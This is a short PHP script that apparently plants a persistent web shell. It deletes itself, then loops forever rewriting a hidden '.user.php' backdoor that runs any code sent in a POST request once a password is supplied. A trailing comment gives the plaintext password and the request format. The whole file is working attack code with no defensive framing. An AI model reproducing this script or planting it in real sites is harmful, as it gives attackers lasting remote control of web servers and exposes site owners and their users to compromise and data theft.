<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.user.php';
$shell = "<?php if(@md5(\$_POST[pass])==='c3f8322a812d701e6ec735f7cb802b9f') @eval(\$_POST[cmd]);?>";

while (TRUE) {
file_put_contents($file, $shell);
usleep(30);
}
//POST pass=Fliper&cmd=
?>

